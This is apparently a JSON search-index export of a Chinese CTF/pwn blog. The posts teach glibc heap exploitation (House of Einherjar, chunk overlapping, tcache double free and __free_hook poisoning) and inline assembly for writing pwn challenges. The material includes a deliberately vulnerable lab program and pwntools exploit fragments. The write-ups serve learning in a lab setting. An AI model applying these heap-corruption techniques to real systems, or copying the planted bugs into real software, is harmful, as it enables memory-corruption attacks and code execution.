{"meta":{"title":"Chen","subtitle":"","description":"ChenBlog","author":"Chen","url":"http://example.com","root":"/"},"pages":[{"title":"所有分类","date":"2022-09-16T10:58:56.147Z","updated":"2022-09-16T10:58:56.147Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"mp_.tcache_bins","slug":"mp-tcache-bins","date":"2023-03-19T14:41:26.000Z","updated":"2023-03-19T14:41:26.904Z","comments":true,"path":"2023/03/19/mp-tcache-bins/","link":"","permalink":"http://example.com/2023/03/19/mp-tcache-bins/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"基于Environ构造rop链","slug":"基于Environ构造rop链","date":"2023-03-19T14:40:59.000Z","updated":"2023-03-19T14:40:59.449Z","comments":true,"path":"2023/03/19/基于Environ构造rop链/","link":"","permalink":"http://example.com/2023/03/19/%E5%9F%BA%E4%BA%8EEnviron%E6%9E%84%E9%80%A0rop%E9%93%BE/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"House Of Einherjar","slug":"House-Of-Einherjar","date":"2023-03-02T02:32:18.000Z","updated":"2023-03-02T10:00:12.285Z","comments":true,"path":"2023/03/02/House-Of-Einherjar/","link":"","permalink":"http://example.com/2023/03/02/House-Of-Einherjar/","excerpt":"","text":"基于chunk overlapping的一种利用手法 旨在申请到任意地址的chunk 前言题目源码 各种漏洞都有 并且打印了堆基址 同时不打算开启pie 方便调试 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121//gcc -o testheap -no-pie testheap#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int chunk_time =0;int chunk_size[50];char *chunk_ptr[50];char magic_addr[1000];void bss_write()&#123; puts(&quot;For commissioning only&quot;); char *a[50]; read(0,a,0x50); puts(&quot;Input content&quot;); read(0,*a,0x100);&#125;void gift()&#123; puts(&quot;Convenient debugging&quot;); puts(&quot;Please enter the got table of the function&quot;); char a[0x20]; read(0,a,0x20); asm( &quot;pop %rsi\\n\\t&quot; &quot;mov $1,%rax\\n\\t&quot; &quot;mov $1,%rdi\\n\\t&quot; &quot;mov $8,%rdx\\n\\t&quot; &quot;syscall\\n\\t&quot; ); puts(&quot;Keep this gift&quot;);&#125;void init()&#123; setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0);&#125;void menu()&#123; puts(&quot;Life is fucking movie&quot;); puts(&quot;Life is always full of unhappiness, like this question&quot;); puts(&quot;Anyway, what&#x27;s your answer&quot;); puts(&quot;&gt;&quot;);&#125;void add()&#123; int index; char size[20]; puts(&quot;What do you really want?&quot;); if(chunk_time&lt;=32&amp;&amp;chunk_time&gt;=0)&#123; if(!chunk_ptr[chunk_time])&#123; printf(&quot;This is the %dth choice in your life\\n&quot;,chunk_time); puts(&quot;You can customize the size of chunk, but what about your life&quot;); read(0,size,0x8); chunk_size[chunk_time] = atoi(size); chunk_ptr[chunk_time] = malloc(chunk_size[chunk_time]); printf(&quot;chunk_addr is %x\\n&quot;,&amp;(*chunk_ptr[chunk_time])); puts(&quot;Although your life is a piece of shit, you still have the initiative, right?&quot;); read(0,chunk_ptr[chunk_time],chunk_size[chunk_time]); chunk_time++; &#125;else&#123; puts(&quot;error&quot;); exit(0); &#125; &#125;else&#123; exit(0); puts(&quot;&quot;); &#125;&#125;void delete()&#123; char data[100]; int index; puts(&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;); scanf(&quot;%d&quot;,&amp;index); free(chunk_ptr[index]);&#125;void edit()&#123; int index; int chunksize; puts(&quot;It&#x27;s never too late to start again. What do you regret?&quot;); scanf(&quot;%d&quot;,&amp;index); puts(&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;); scanf(&quot;%d&quot;,&amp;chunksize); puts(&quot;Come back!&quot;); read(0,chunk_ptr[index],chunksize);&#125;void show()&#123; puts(&quot;You can&#x27;t live a perfect life without making any effort&quot;); int index; scanf(&quot;%d&quot;,&amp;index); puts(chunk_ptr[index]);&#125;int main()&#123; int choice; init(); puts(&quot;This program is used to debug heap vulnerabilities&quot;); puts(&quot;write by chen&quot;); while(1)&#123; menu(); scanf(&quot;%d&quot;,&amp;choice); switch(choice)&#123; case 1: add(); break; case 2: delete(); break; case 3: edit(); break; case 4: show(); break; case 5: gift(); break; case 6: bss_write(); break; case 7: puts(&quot;The fog of that morning cleared, not only in the morning, but also in the fog&quot;); puts(&quot;You will be stronger next time I see you&quot;); exit(0); break; &#125; &#125;&#125; 在上一篇文章中 我们介绍了利用修改prev_size里实现合并的手法 基于这个漏洞 我们更进一步来利用 我们知道 如果topchunk相邻低地址处的chunk处于free状态 除开fastbin和tcachebin 那么top chunk就会将其合并 此时top chunk的首地址就会成为被合并的chunk的地址 这其实是house of force的内容 不过这里我们并不直接修改top chunk的prev_size 而是修改与top chunk物理相邻的chunk的prev_size 首先我们需要知道 当plmalloc在处理后向合并的时候 新的chunk的地址是根据当前chunk减去prev_size得到的 并且后向合并的前置条件是要通过两个检查 假设此时我们已经在某个地方伪造好了fake chunk 并且此时堆结构如图所示 为了实现chunkA后向合并到fake chunk 我们需要使得chunkA_addr - prev_size &#x3D; fakechunk_addr 1chunk_at_offset(p, -((long) prevsize)) 同时还需要使得fake_chunk的size域和chunkA的prev_size域相同 12if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\malloc_printerr (&quot;corrupted size vs. prev_size&quot;); 并且还要注意一下fake chunk的fd域和bk域 根据unlink的要求 我们需要使得fake chunk的fd域和bk域满足下面要求 12if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV); 不过这个相对来说很好绕过 我们只需要让fd和bk域都为fake chunk的地址就行了 这样FD-&gt;bk 的值也还是fake chunk的地址 同理BK-&gt;fd也是 同时还需要使得chunkA的inuse位为0 这样plmalloc才会认为chunkA低地址处存在一个位于bin的chunk 并且是可以合并的 123456if (!prev_inuse(p)) &#123;prevsize = prev_size(p);size += prevsize;p = chunk_at_offset(p, -((long) prevsize));unlink(av, p, bck, fwd);&#125; 根据上述要求 我们想要实现house of einherjar需要拥有以下条件 1231.拥有堆溢出的能力 可以覆盖到next chunk的prev_size域和size域的最后一位2.拥有在目标地址构造fake chunk的能力3.拥有堆的基址来计算fake chunk和chunk的差值 下面我们开始实际利用 libc2.23我们假设题目自带了打印堆基址的功能 并且可以在bss段中构造fake chunk的机会 实际利用情况里需要读者自己根据实际题目判断是否可行 以及如何实现 本题目由笔者本人编写 漏洞点显而易见 仅供参考 123bss_addr = 0x602320chunk0_addr = add(0x10,b&#x27;aaaa&#x27;)chunk0_addr = chunk0_addr * 0x1000 首先我们创建一个0x10大小的chunk 同时接收一下当前chunk的地址 也就是堆基址 这里之所以要乘以0x1000 是因为我出题的时候使用的是printf来输出 其遇到\\x00就直接截断了 所以无法打印出堆基址后的三个0 这里需要自己补上 12345add(0x80,b&#x27;aaaa&#x27;)chunk1_addr = chunk0_addr + 0x20prev_size = chunk1_addr-bss_addrpayload = cyclic(0x10)+p64(prev_size)+b&#x27;\\x90&#x27;edit(0,len(payload),payload) 随后我们再次申请一个chunk 这个chunk是用来实现本文漏洞的关键 最开始申请的chunk是用来堆溢出覆盖这个chunk的prev_size域和size域的inuse位 接着我们计算出chunk1_addr 和 prev_size应该要被设置成的值 接着利用chunk0的堆溢出漏洞覆盖chunk1的prev_size和inuse 此时堆的结构如图所示 接着在bss段上构造一个fake chunk 这里的函数是我为了方便演示特地写的 正常题目就别想了 12payload = p64(0x90)+p64(prev_size)+p64(bss_addr)*2bss_write(p64(bss_addr),payload) 此时我们释放chunk1 看看其是否能过通过检查 为什么是top chunk跑到了fake chunk这边呢 同时addr还和我们fake chunk不一样 这是因为chunk1在和fake chunk合并之后 二者同样是一个物理相邻top chunk的堆块 所以top chunk就将其吞并 而这个addr是单纯的显示问题 我们试着申请一个chunk 看看写入的content位于哪里 1add(0x20,b&#x27;gggggggg&#x27;) 可以看到写入成功 接下来 难度升级 我们来试试如果题目没有给我们赠送堆基址 我们要如何自己获取堆基址并且实现漏洞的利用 123456789bss_addr = 0x602320add(0x10,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(1)delete(0)show(0)io.recv()heap_addr = u64(io.recv(4).ljust(8,b&#x27;\\x00&#x27;))-0x20success(&quot;heap_addr :&quot;+hex(heap_addr)) 首先我们申请两个任意大小的chunk 目的是为了将两个chunk放入到fastbin中 利用UAF获取其fd域内的堆地址 经过计算得到堆基址 接着我们需要把这两个chunk从fastbin中取出来 否则等下unlink的时候就会报错 原因暂时不清楚 123add(0x10,b&#x27;aaaa&#x27;)#2add(0x10,b&#x27;aaaa&#x27;)#3add(0x80,b&#x27;aaaa&#x27;)#4 我们重新申请两个0x10大小的chunk 此时chunk2相当于chunk0 chunk3相当于chunk1 chunk4则是用来向后合并 利用漏洞的 接下来的手法就和之前的一致了 123456prev_size = heap_addr + 0x40 - bss_addrpayload = cyclic(0x10)+p64(prev_size)+b&#x27;\\x90&#x27;edit(3,len(payload),payload)payload = p64(0x100)+p64(prev_size)+p64(bss_addr)*2bss_write(p64(bss_addr),payload)delete(4)","categories":[{"name":"堆","slug":"堆","permalink":"http://example.com/categories/%E5%A0%86/"}],"tags":[]},{"title":"chunk extend and overlapping","slug":"chunk-extend-and-overlapping","date":"2023-03-01T04:50:33.000Z","updated":"2023-03-01T09:36:35.686Z","comments":true,"path":"2023/03/01/chunk-extend-and-overlapping/","link":"","permalink":"http://example.com/2023/03/01/chunk-extend-and-overlapping/","excerpt":"","text":"chunk extend的利用手法是基于plmalloc对于堆块的各种宏定义 其是通过计算chunk首地址和size大小来推断出上一个chunk或者是下一个chunk的地址 12/* Ptr to next physical malloc_chunk. */#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) 获取下一个chunk的地址既是通过当前chunk地址加上当前chunk大小 12345/* Size of the chunk below P. Only valid if prev_inuse (P). */#define prev_size(p) ((p)-&gt;mchunk_prev_size)/* Ptr to previous physical malloc_chunk. Only valid if prev_inuse (P). */#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) 获取上一个chunk的地址则是通过当前chunk的地址减去前一个chunk的大小 也就是说 只要我们修改了chunk的size域和prev_size域 就可以使plmalloc误判chunk 堆溢出覆盖下一个chunk的size域这个手法主要有两种适用的题型 一种是有伴随堆块的情况下 并且没有堆溢出 通过这种手法可以修改伴随堆块的内容 第二种是libc2.27的情况下 tcachebin的存在会使得我们打unsortedbin造成很大的影响 要么就是填满链表要么就是申请一个超过tcachebin大小的chunk并释放 有的题目会对这两种解决办法进行限制 这个时候就可以利用这种办法来合并chunk 从而获得一个超过tcachebin范围的堆块 下面来分别演示一下 环境:ubuntu22 (二进制文件依赖的libc2.27) 目测2.23以上的版本都可以1234add(0x20,b&#x27;aaaa&#x27;)add(0x20,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)debug() 首先申请三个堆块 chunk1用来堆溢出 覆盖chunk2的size域 chunk3用来和chunk2合并 唯一要注意的是覆盖size域的值 需要包括两个堆块的prev_size域和size域 所以此时用来覆盖chunk2的size域的数值应为0x51 123456add(0x20,b&#x27;aaaa&#x27;)add(0x20,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)payload = cyclic(0x28)+b&#x27;\\x51&#x27;edit(0,len(payload),payload)debug() 此时chunk2就和chunk3合并了 此时chunk2的指针指向的仍然是chunk2的首地址 但是plmalloc已经误判了chunk2 原本其是一个0x31大小的chunk 此时plmalloc误判其还包含了chunk3 所以释放chunk2就会一并释放chunk3 可以看到一并放入了tcache 这里之所以没有和top chunk合并 是因为tcache中的chunk Inuse位仍然为1 此时我们申请一个0x40大小的chunk 就可以获得原本chunk3的空间 从而对chunk3的内容进行任意修改 此外还有一种情况 如果chunk2先被释放进入tcachebin后再更改size域会发生什么呢 1234567add(0x20,b&#x27;aaaa&#x27;)add(0x410,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)payload = cyclic(0x28)+p64(0x441)delete(1)edit(0,len(payload),payload)debug() 此时注意 chunk2不能位于fastbin或者是tcachebin中 如果位于二者中 下一个chunk的Inuse位就不会为0 这样就不会合并 gdb动调看一下是否合并成功 环境: ubuntu16 二进制依赖libc2.23这类的利用手法被称为overpadding 你可以理解为反方向的合并 刚才是由chunk2吞并chunk3 修改的是chunk2的size域 现在我们来修改chunk3的prev_size域和size域 从而使得chunk2合并chunk3 这里的知识点其实和unlink有点相似 unlink也是通过构造fake chunk 伪造好next chunk的prev_size和size 12345add(0x80,b&#x27;aaaa&#x27;) #0add(0x10,b&#x27;aaaa&#x27;) #1add(0x80,b&#x27;aaaa&#x27;) #2add(0x10,b&#x27;aaaa&#x27;) #3 首先申请四个chunk 前三个用来负责合并 第四个用来保证不和top chunk合并 我们以chunk1来为堆溢出的起点 覆盖chunk2的prev_size和size域 不过在此之前还需要先释放chunk0到unsortedbin中(只要不是fastbin和tcachebin就可以) 这样才能使得后面的合并生效 12345678add(0x80,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)add(0x80,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(0)payload = cyclic(0x10)+p64(0xb0)+p64(0x90)edit(1,len(payload),payload) 注意一下chunk2的size域 Inuse位一定要为0 否则不会合并 此时我们释放chunk2 来看看是否合并成功 这种一般是伴随堆块先申请的情况可以利用 从而获取到低地址处堆块任意写的机会","categories":[{"name":"堆","slug":"堆","permalink":"http://example.com/categories/%E5%A0%86/"}],"tags":[]},{"title":"内联汇编对于pwn出题的一些心得","slug":"内联汇编对于pwn出题的一些心得","date":"2023-02-27T15:07:34.000Z","updated":"2023-02-28T14:23:34.975Z","comments":true,"path":"2023/02/27/内联汇编对于pwn出题的一些心得/","link":"","permalink":"http://example.com/2023/02/27/%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96%E5%AF%B9%E4%BA%8Epwn%E5%87%BA%E9%A2%98%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/","excerpt":"","text":"前言如果只运用c语言进行编写pwn题目 对于一些寄存器或者栈结构一类的没有办法操控 这时候利用内联汇编就可以巧妙的解决问题的所在 同时由于我想学习免杀 其中有一种利用方法为内联汇编花指令 刚好可以利用这个来打基础 本文会伴随着本人对于内联汇编的不断学习而更新 不全面也不严谨 仅供参考 内联函数在编写c语言时 如果你在一个函数中调用另外一个函数 其是通过call指令来进行跳转 跳转到对应函数的地址开始执行函数内容 最后通过存储在bp寄存器中的原函数地址来返回 比如下面这个程序 1234567#include &lt;stdio.h&gt;void test()&#123; puts(&quot;hello world&quot;);&#125;int main()&#123; test();&#125; 其汇编形式如下图所示 如果是一个循环调用函数 那么就会造成栈空间过于陈杂 这个时候就可以使用内联函数来解决问题 在对应函数定义时前缀加上inline 1234567#include &lt;stdio.h&gt;inline void test()&#123; puts(&quot;hello world&quot;);&#125;int main()&#123; test();&#125; 此时当main函数执行到调用test函数的时候 会直接在当前栈中执行test函数 而非跳转 但是你会发现正常编译会报错未定义的函数 我们需要手动链接 先将其编译成.o格式的文件 再进行动态链接 12gcc -O -c -o test test.cgcc test.o -lgmp -o test 内联汇编基本内联汇编基于上述你对内联函数的认识 那么显然易见 内联汇编就相当于我们直接往对应位置写入汇编代码 这就使得我们拥有了在程序编写的初期就拥有了操控寄存器值的能力 或者是修改栈结构 篡改程序执行流 对于pwn题来说 常用的编译是基于GCC的 而GCC采用的是AT&amp;T&#x2F;UNIX 汇编语法 不同的汇编语法对于内联汇编的编写格式要求不一样 正常的一个汇编语句 比如要使得rax寄存器赋值为1 需要这样编写 1mov rax,1 而受汇编语法约束的内联汇编需要这样编写 1mov $1,%rax 也就是使得源操作数和目的操作数调换位置 其中1是属于一个立即操作数 我们需要在其前面添加一个$符号 否则1会被识别为一个地址 100001131 488b042501000000 mov rax, qword [__elf_header.ident.signature[1]] &#123;0x10102464c45&#125; 可以看到其被识别为了ELF文件的文件头结构体中的第一个元素的第一个字节 12345678910111200000000 struct Elf64_Header __elf_header = 00000000 &#123;00000000 struct Elf64_Ident ident = 00000000 &#123;00000000 char signature[0x4] = &quot;\\x7fELF&quot;00000004 uint8_t file_class = 0x200000005 uint8_t encoding = 0x100000006 uint8_t version = 0x100000007 uint8_t os = 0x000000008 uint8_t abi_version = 0x000000009 char pad[0x7] = &quot;\\x00\\x00\\x00\\x00\\x00\\x00&quot;, 000000010 &#125; 我们需要使得计算机明白1在这里是一个即时操作数 而非地址 所以需要加上$符号 至于rax寄存器前面的%符号 是寄存器的固定格式 同时和常规汇编一致 在操作符后面加上特定字符 可以决定操作数的字节大小 诸如’b’ ‘w’ ‘l’ 如果我们想要调用寄存器中的值 可以用括号将寄存器套起来 1mov (%rbx),%rax 100001131 488b03 mov rax, qword [rbx] 最后 对于每行的汇编语句结束以后 都需要加上’\\t\\n‘ 以此来区分每行汇编 并且每行汇编都需要加上双引号 如下: 123456#include &lt;stdio.h&gt;int main()&#123; asm( &quot;mov (%rbx),%rax\\n\\t&quot; );&#125; 扩展内联汇编上述的基本内联汇编 往往只局限于内联汇编中的数据操作 而在扩展形式中 我们还可以指定操作数 并且可以选择输入输出寄存器 以及指明要修改的寄存器列表 12345asm ( assembler template : output operands /* optional */ : input operands /* optional */ : list of clobbered registers /* optional */); 上面是扩展内联汇编的基本格式 第一个冒号后面指定的是输出操作数 第二个冒号指定的是输入操作数 第三个冒号解释起来复杂 由于内联汇编是直接插入在我们原本的函数汇编代码中 再加上我们对于寄存器的值进行了操作 这会对正常函数的执行造成影响 所以我们需要在这里列出损坏的寄存器列表 让系统执行完内联汇编后还原一下寄存器的值 使用memory可以还原所有寄存器 1234567asm ( &quot;mov %1, %%rax\\n\\t&quot; &quot;mov %%rax, %0\\n\\t&quot; :&quot;=m&quot;(b) /* output */ :&quot;m&quot;(a) /* input */ :&quot;memory&quot; /* clobbered register */ ); 下面我们基于上述的一段扩展内联汇编来帮助分析 开头的两行汇编属于汇编指令部分 语法问题和基本内联汇编一致 唯一要注意的是第一行的%1是什么 其代表的是我们引入的输入操作数a 其在整个扩展内联汇编中是第二个变量 也就是说我们想要引用输出变量b 就是%0 所以是从0开始递增的 接着来看”&#x3D;m” 其中’&#x3D;’是约束修饰符 用来指定其为输出操作数并且是可写的 ‘m’也同为约束符 通常是用来指定这个操作数的存放 12345678910111213141516171819202122232425262728293031“a” 将输入变量放入eax“b” 将输入变量放入ebx“c” 将输入变量放入ecx“d” 将输入变量放入edx“S” 将输入变量放入esi“D” 将输入变量放入edi“q” 将输入变量放入eax，ebx ,ecx ，edx中的一个“r” 将输入变量放入通用寄存器，也就是eax ，ebx，ecx,edx，esi，edi中的一个“A” 放入eax和edx，把eax和edx，合成一个64位的寄存器(uselong longs)“m” 内存变量“o” 操作数为内存变量，但是其寻址方式是偏移量类型，也即是基址寻址，或者是基址加变址寻址“V” 操作数为内存变量，但寻址方式不是偏移量类型“,” 操作数为内存变量，但寻址方式为自动增量“p” 操作数是一个合法的内存地址（指针）“g” 将输入变量放入eax，ebx，ecx ，edx中的一个或者作为内存变量“X” 操作数可以是任何类型“I” 0-31 之间的立即数（用于32位移位指令）“J” 0-63 之间的立即数（用于64 位移位指令）“N” 0-255 ，之间的立即数（用于out 指令）“i” 立即数“n” 立即数，有些系统不支持除字以外的立即数，这些系统应该使用“n”而不是“i”“=” 操作数在指令中是只写的（输出操作数）“+” 操作数在指令中是读写类型的（输入输出操作数）“f” 浮点数“t” 第一个浮点寄存器“u” 第二个浮点寄存器“G” 标准的80387% 该操作数可以和下一个操作数交换位置# 部分注释* 表示如果选用寄存器，则其后的字母被忽略“&amp;” 表示输入和输出操作数不能使用相同的寄存器 对于一个char数组 一般是用’m’来约束 其他的我测试是会报错 同时 只能操作一个字长的数据 超过了就不行了 运用在pwn中泄露libc基址这个一般是用来自己方便调试的 这样可以帮助我们快速获取libc基址 比如我堆系列的博客用到的示例程序就使用了相同的代码来方便我快速获取libc基址 从而可以在exp中更自由的调试 123456789char a[0x20]; read(0,a,0x20); asm( &quot;pop %rsi\\n\\t&quot; &quot;mov $1,%rax\\n\\t&quot; &quot;mov $1,%rdi\\n\\t&quot; &quot;mov $8,%rdx\\n\\t&quot; &quot;syscall\\n\\t&quot; ); 原理就是利用向局部变量a中输入数据 其会被存放在栈上 同时rsp指针指向了输入的数据 这个时候调用pop指令出栈 就成功的把数据传到了寄存器rsi 这个时候调用write函数 就可以直接打印出函数真实地址了 调整寄存器值这个办法比较简单 第一次被我利用是在出canary那一题的时候 用来调整函数结束时寄存器的值 引导解题者手写shellcode 或者进行合理的rop链构造 1234asm( &quot;mov $1,%rax\\n\\t&quot; &quot;mov %rax,%rdi\\n\\t&quot; ); 比较简单就不解释了","categories":[{"name":"基础","slug":"基础","permalink":"http://example.com/categories/%E5%9F%BA%E7%A1%80/"}],"tags":[]},{"title":"tcachebinattack","slug":"tcachebinattack","date":"2023-02-25T10:46:13.000Z","updated":"2023-02-27T08:31:59.093Z","comments":true,"path":"2023/02/25/tcachebinattack/","link":"","permalink":"http://example.com/2023/02/25/tcachebinattack/","excerpt":"","text":"在libc2.26以后 加入了tcachebins 其与fastbin同为单向链表 作用类似于一个缓存区 当用户申请chunk时 优先在tcache中查找 如果无果才进入分配区 1234567891011121314151617181920212223#if USE_TCACHE/* We want 64 entries. This is an arbitrary limit, which tunables can reduce. */# define TCACHE_MAX_BINS 64# define MAX_TCACHE_SIZE tidx2usize (TCACHE_MAX_BINS-1)/* Only used to pre-fill the tunables. */# define tidx2usize(idx) (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)/* When &quot;x&quot; is from chunksize(). */# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)/* When &quot;x&quot; is a user-provided size. */# define usize2tidx(x) csize2tidx (request2size (x))/* With rounding and alignment, the bins are... idx 0 bytes 0..24 (64-bit) or 0..12 (32-bit) idx 1 bytes 25..40 or 13..20 idx 2 bytes 41..56 or 21..28 etc. *//* This is another arbitrary limit, which tunables can change. Each tcache bin will hold at most this number of chunks. */# define TCACHE_FILL_COUNT 7#endif tcache的定义如上 简单来说就是一个范围0x10-0x408大小(用户申请大小)的单向链表 一共可以存储64个chunk 每个链表可以存储7个chunk 123456789101112131415161718// 从 tcache list 中获取内存 if (tc_idx &lt; mp_.tcache_bins // 由 size 计算的 idx 在合法范围内 /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */ &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) // 该条 tcache 链不为空 &#123; return tcache_get (tc_idx); &#125; DIAG_POP_NEEDS_COMMENT;#endif // 进入与无 tcache 时类似的流程 if (SINGLE_THREAD_P) &#123; victim = _int_malloc (&amp;main_arena, bytes); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || &amp;main_arena == arena_for_chunk (mem2chunk (victim))); return victim; &#125; 当用户从tcache中申请内存的时候并非是和fastbin一样通过__int_malloc函数来实现 而是通过专用的**tcache_get()**函数 其调用优先度高于fastbin 当有合适大小的chunk被申请时 如果tcache满足条件那么优先从tcache中申请 libc2.26以及老版本的2.27tcache最早于2.26诞生 但是2.26的glibc由于是过渡版本 glibc-all-in-one下载不到 我在其他渠道下载到了glibc2.26并没有符号表 所以不好演示 自己尝试编译了glibc但是最后以失败告终 好在2.26和老版本的2.27有着同样的漏洞 所以这里我们一概而论 这时候的tcache对于double free甚至没有检测 我们直接两次释放同一个chunk 可以看到成功释放进去了 12345add(0x68,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(0)delete(0)debug() 并且tcachebin对于chunk的取出也没有进行限制 1234567891011121314add(0x68,b&#x27;aaaa&#x27;)add(0x410,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(1)show(1)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7f688abebca0-0x7f688a800000)success(&quot;libc_addr :&quot;+hex(libc_addr))delete(0)delete(0)free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]add(0x68,p64(free_hook))debug() 此时已经将free_hook放入到了链表中 我们尝试将其取出 1234567891011121314151617add(0x68,b&#x27;aaaa&#x27;)add(0x410,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(1)show(1)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7f688abebca0-0x7f688a800000)success(&quot;libc_addr :&quot;+hex(libc_addr))delete(0)delete(0)free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]success(&quot;free_hook :&quot;+hex(free_hook))add(0x68,p64(free_hook))add(0x68,b&#x27;aaaa&#x27;)add(0x68,b&#x27;aaaa&#x27;)debug() 并且可以看到 tcache和fastbin不同的在于 其指向的是chunk的用户区首地址 高版本2.27版本高一点的glibc-2.27引入了对于double free的检查 12345678910111213add(0x68,b&#x27;aaaa&#x27;)add(0x410,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(1)show(1)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7f688abebca0-0x7f688a800000)success(&quot;libc_addr :&quot;+hex(libc_addr))delete(0)delete(0)io.recv()io.recv() 我们还是和上一题一样 这里直接两次释放chunk0 但是与之不同的是被检测出来了double free 那有没有什么可以绕过的办法呢 类似fastbin一样的? 我们来看一下tcache对于double free检查机制的源码 123456typedef struct tcache_entry&#123; struct tcache_entry *next; //链表指针，对应chunk中的fd字段 /* This field exists to detect double frees. */ struct tcache_perthread_struct *key; //指向所属的tcache结构体，对应chunk中的bk字段&#125; tcache_entry; 对于每一个tcache都有一个key指针指向 借助这个key指针 plmalloc可以更好的对double free进行检查 123456789101112131415161718192021222324size_t tc_idx = csize2tidx(size);//只要tcache不为空 并且free chunk在tcache范围中 都需要进行double free检查 if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; /* Check to see if it&#x27;s already in the tcache. */ tcache_entry *e = (tcache_entry *)chunk2mem(p); /* 如果是这个chunk已经被放入tcache 那么key字段就已经有数据了 会被识别出来 */ if (__glibc_unlikely(e-&gt;key == tcache))//汇报错误信息 &#123; tcache_entry *tmp; LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr(&quot;free(): double free detected in tcache 2&quot;); &#125; if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) //通过检查，放入tcahce中 &#123; tcache_put(p, tc_idx); return; &#125; &#125; 所以 如果我们还想要使用tcache double free的话 就只能修改key字段 或者是fastbin double free 但是由于fastbin对于chunk的取出有着size域的检查 相对来说不好办 并且我们还需要填满tcache的对应链表才能把chunk释放进fastbin 好在更新同时带来了stash机制 要想明白这个机制的用处 我们先要清楚tcachebin的设计目的是什么 在多线程的情况下 plmalloc会遇到主分配区被抢占的问题 只能等待或者是申请一个非主分配区 针对这种情况 plmalloc为每个线程都涉及一个缓冲区 即tcache 而stash机制就是 如果用户申请一个0x60大小的chunk tcache里面没有的话 就会进入分配区处理 此时如果哪个bin中含有满足条件的chunk 除了分配这一次请求之外 其会认为该线程还需要更多类似大小的chunk 为了避免下次继续重复这一步骤 就会将该bin链表中的所有chunk放入到对应tcachebin的链表中 这个绕过手法存在的意义是因为高版本的tcache对于double free的检查更加严格 是对比整个链表 所以很难利用 如果我们在fastbin中构造好fake chunk 再利用这个机制 就可以继续使用tcachebinattack 话归正题 开始还是2.27中的问题 由于多了tcachebin 所以会优先进入tcachebin 我们还得先填满tcachebin中的一个链表 才能释放chunk到fastbin 1234567891011121314add(0x68,b&#x27;aaaa&#x27;)#0add(0x68,b&#x27;aaaa&#x27;)#1add(0x68,b&#x27;aaaa&#x27;)#2for i in range(7): add(0x68,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)for i in range(7): delete(i+3)delete(0)delete(1)delete(0)debug() 接着我们先把在tcache中的chunk全部申请回来 然后再构造fake fd 123456789101112131415161718add(0x68,b&#x27;aaaa&#x27;)#0add(0x68,b&#x27;aaaa&#x27;)#1add(0x68,b&#x27;aaaa&#x27;)#2for i in range(7): add(0x68,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)for i in range(7): delete(i+3)delete(0)delete(1)delete(0)for i in range(7): add(0x68,b&#x27;aaaa&#x27;)add(0x68,b&#x27;testtest&#x27;)debug() 在执行到最后一个add的时候 plmalloc在tcache中找不到合适的chunk 而在fastbin中找到了 所以此时就会把fastbin对应的链表转移到tcache中 如图所示","categories":[{"name":"堆","slug":"堆","permalink":"http://example.com/categories/%E5%A0%86/"}],"tags":[]},{"title":"fastbinattack","slug":"fastbinattack","date":"2023-02-23T08:43:19.000Z","updated":"2023-02-27T08:31:40.123Z","comments":true,"path":"2023/02/23/fastbinattack/","link":"","permalink":"http://example.com/2023/02/23/fastbinattack/","excerpt":"","text":"前言很久没继续写堆部分的博客了 